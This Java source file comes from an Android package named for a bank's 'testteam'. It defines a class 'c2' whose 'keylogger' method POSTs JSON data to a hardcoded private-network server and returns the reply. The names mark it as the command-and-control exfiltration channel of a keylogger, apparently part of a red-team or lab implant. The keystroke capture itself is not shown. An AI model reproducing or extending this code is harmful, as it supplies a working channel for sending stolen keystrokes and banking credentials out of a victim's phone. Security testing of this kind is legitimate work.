package ambank.gtr.testteam;

import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class c2 {
    String SERVER_URL = "http://192.168.1.165:3000";
    public String keylogger(String jsonBody) {
        HttpURLConnection connection = null;
//        String jsonBody = String.valueOf(convert(data));

        try {
            URL url = new URL(SERVER_URL + "/test");
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("Accept", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);

            byte[] body = jsonBody.getBytes(StandardCharsets.UTF_8);
            connection.setFixedLengthStreamingMode(body.length);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(body);
            }

            int code = connection.getResponseCode();
            java.io.InputStream stream = (code >= 200 && code < 300)
                    ? connection.getInputStream()
                    : connection.getErrorStream();

            String response = "";
            if (stream != null) {
                response = new String(stream.readAllBytes(), StandardCharsets.UTF_8);
                stream.close();
            }

            return code + " " + response;
        } catch (Exception e) {
            e.printStackTrace();
            return "error: " + e.getMessage();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

}
